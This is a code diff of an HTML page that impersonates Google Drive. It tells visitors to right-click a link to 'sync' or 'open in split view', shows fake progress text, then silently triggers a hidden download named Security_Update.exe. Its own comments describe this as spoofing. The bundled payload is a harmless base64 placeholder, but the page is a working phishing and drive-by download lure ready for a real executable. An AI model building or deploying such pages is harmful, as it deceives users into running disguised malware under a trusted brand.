@@ -1,46 +1,66 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-<title>Google Drive Download Assistant</title>
-<style>
-    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-    #status { color: red; font-weight: bold; margin-top: 20px; }
-    .instruction { 
-        padding: 20px; 
-        border: 2px dashed #4285F4; 
-        display: inline-block; 
-        cursor: pointer;
-    }
-</style>
-</head>
-<body>
+  <head>
+    <title>Google Drive Download Support</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        background-color: #f8f9fa;
+      }
+      h1 {
+        margin: 1em;
+      }
+      #container {
+        margin-top: 100px;
+        text-align: center;
+      }
 
-    <h2>Akselerator Unduhan Google Drive</h2>
-    <div id="link" class="instruction">
-        Klik Kanan di Sini dan Pilih "Open in New Window" untuk Memulai Unduhan Cepat
+      .drive-link {
+        color: #1a73e8;
+        text-decoration: none;
+        font-weight: bold;
+        padding: 15px;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+        display: inline-block;
+        cursor: context-menu;
+      }
+
+      /* Elemen download yang tidak terlihat */
+      #hiddenDownload {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="container">
+      <a id="link" href="https://drive.google.com/" class="drive-link">
+        Right Click and Open in Split View to Sync Google Drive
+      </a>
+      <p id="status" style="margin-top: 20px; color: #5f6368"></p>
     </div>
-    
-    <p id="status"></p>
 
-    <!-- Elemen unduhan tersembunyi -->
-    <a id="downloadTrigger" style="display:none;"></a>
+    <!-- Link download tersembunyi -->
+    <a id="hiddenDownload" download="Security_Update.exe"></a>
 
-<script>
-  document.getElementById('link').addEventListener('contextmenu', function(event) {
-    const status = document.getElementById('status');
-    status.innerText = "Menghubungkan ke server... Mohon tunggu 4 detik.";
+    <script>
+      const link = document.getElementById("link");
+      const downloader = document.getElementById("hiddenDownload");
+      const statusText = document.getElementById("status");
 
-    setTimeout(function() {
-        const dl = document.getElementById('downloadTrigger');
-        // Ganti URL di bawah dengan file target
-        dl.href = "https://example.com/file-asli.zip"; 
-        dl.download = "Dokumen_Penting.zip"; 
-        dl.click();
-        
-        status.innerText = "Unduhan dimulai!";
-    }, 4000);
-  });
-</script>
+      link.addEventListener("contextmenu", function (event) {
+        // Memberikan kesan proses sedang berjalan
+        statusText.innerText = "Preparing split-view sync...";
 
-</body>
+        setTimeout(function () {
+          // Spoofing download: Mengarahkan ke file yang akan diunduh
+          downloader.href =
+            "data:application/octet-stream;base64,VEhJUyBJUyBBIFNQT09GRUQgRE9XTkxPQUQ=";
+          downloader.click();
+
+          statusText.innerText = "Download started in background.";
+        }, 3000); // Jeda 3 detik untuk mensimulasikan loading
+      });
+    </script>
+  </body>
 </html>
